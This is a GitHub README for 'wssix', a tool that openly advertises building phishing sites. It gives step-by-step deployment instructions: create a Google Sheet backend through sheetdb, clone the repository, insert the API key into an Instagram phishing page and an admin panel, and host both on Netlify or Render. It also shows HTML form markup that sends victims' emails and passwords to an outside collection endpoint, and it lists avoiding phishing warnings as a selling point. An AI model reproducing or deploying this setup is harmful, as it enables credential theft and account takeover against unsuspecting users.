
# wssix
wssix helps you to create your own phishing tool.

## Benefits of this tool

- Admin panel 
- 24/7 Online 
- No phishing warnings on webpage
- Create unlimited custom phish websites

## Deployment

#### Creating API key...

- First you have to create blank google sheet.
- Make this sheet public and inside this sheet type email and password on first two cells.( **not real email password , just type this words** )

- Now go to [sheetdb.com](https://sheetdb.io/). Create account and click on create new api and inside this paste your google sheet url ( which we created in first step ).
 
- After this your api key is ready. Api is looks like 

```
	https://sheetdb.io/api/v1/xvxbpk*******
```

#### Setup Phish page and Admin Panel ...

- Now, First clone this repository
```bash
git clone https://github.com/Harsh-bash/wssix
```
- Inside Instagram-phish folder , Open **index.html** file.

- In this file search this string : 
```bash
    http://your-sheetdb-api
```
and replace this with Your API.

- Now open **Admin-wssix** Folder.
- Goto **/static/js/** folder and open **main.864cb797.js** file.

- In this file search this string :
```bash 
http://your-sheetdb-api
```
and replace with your  **sheetdb** api.

**All done.....**

Now host **Admin-wssix** folder and **Instagram-phish** folder separately.
For hosting : 

- [**Netlify**](https://netlify.com/)
- [**Render**](https://render.com/)

### Now! we have our own instagram phishing page tool

## Create custom phish page 

- To send data from your **HTML FORM** to google sheets,
set you form tag **id,method,action and submit** as follow:

```javascript
<form id="sheetdb-form" method="post" action="https://YOUR_SHEETDB_API">
```

- Set **name** in username input tag as follow : 
```javascript
name="data[email]"
```

- Set **name** in password input tag as follow : 
```javascript
name="data[password]"
```

- Set Submit button as follow : 
```javascript
type="submit" name="submit"
```

**Now all data from this form is save in your google sheets and you can access it with this **admin panel**.


